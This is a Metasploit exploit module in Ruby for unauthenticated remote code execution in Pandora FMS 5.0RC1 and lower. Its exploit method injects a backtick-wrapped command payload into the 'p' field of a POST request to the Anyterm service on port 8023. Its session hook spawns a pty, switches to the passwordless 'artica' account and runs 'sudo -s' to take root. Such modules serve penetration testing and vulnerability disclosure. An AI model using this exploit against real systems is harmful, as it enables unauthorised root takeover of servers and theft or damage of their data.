 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Pandora FMS Remote Code Execution",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Pandora FMS 5.0RC1 and lower.
        It will leverage an unauthenticated command injection in the Anyterm service on
        port 8023. Commands are executed as the user "pandora". In Pandora FMS 4.1 and 5.0RC1
        the user "artica" is not assigned a password by default, which makes it possible to su
        to this user from the "pandora" user. The "artica" user has access to sudo without a
        password, which makes it possible to escalate privileges to root. However, Pandora FMS 4.0
        and lower force a password for the "artica" user during installation.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;xistence <xistence[at]0x90.nl>&#039; # Vulnerability discovery and Metasploit module
        ],
      &#039;References&#039;      =>
        [
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "",
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl python&#039;,
            }
        },
      &#039;Platform&#039;        => [&#039;unix&#039;],
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Targets&#039;         =>
        [
          [&#039;Pandora 5.0RC1&#039;, {}]
        ],
      &#039;Privileged&#039;      => true,
      &#039;DisclosureDate&#039;  => "Jan 29 2014",
      &#039;DefaultTarget&#039;   => 0))
 
    register_options(
      [
       Opt::RPORT(8023),
       OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to the Pandora instance&#039;, &#039;/&#039;]),
      ], self.class)
  end
 
  def on_new_session(client)
    print_status("#{peer} - Trying to escalate privileges to root")
    [
      # ignore SIGHUP so the server doesn&#039;t kill our root shell
      "trap &#039;&#039; HUP",
      # Spawn a pty for su/sudo
      "python -c &#039;import pty;pty.spawn(\"/bin/sh\")&#039;",
      # Su to the passwordless "artica" account
      "su - artica",
      # The "artica" use has sudo rights without the need for a
      # password, thus gain root priveleges
      "sudo -s",
    ].each do |command|
      vprint_status(command)
      client.shell_write(command + "\n")
    end
 
    super
  end
 
  def check
    # Check version
    print_status("#{peer} - Trying to detect Pandora FMS Remote Gateway")
 
    res = send_request_cgi({
     &#039;method&#039; => &#039;GET&#039;,
     &#039;uri&#039;    => normalize_uri(target_uri.path, "anyterm.html")
    })
 
    if res && res.code == 200 && res.body.include?("Pandora FMS Remote Gateway")
      print_good("#{peer} - Pandora FMS Remote Gateway Detected!")
      return Exploit::CheckCode::Detected
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    print_status("#{peer} - Sending payload")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, "/anyterm-module"),
      &#039;vars_post&#039;   => {
        &#039;a&#039;     => "open",
        &#039;p&#039; => "`#{payload.encoded}`"
      }
    })
 
    if !res || res.code != 200
      fail_with(Failure::Unknown, "#{peer} - Unexpected response, exploit probably failed!")
    end
  end
 
end

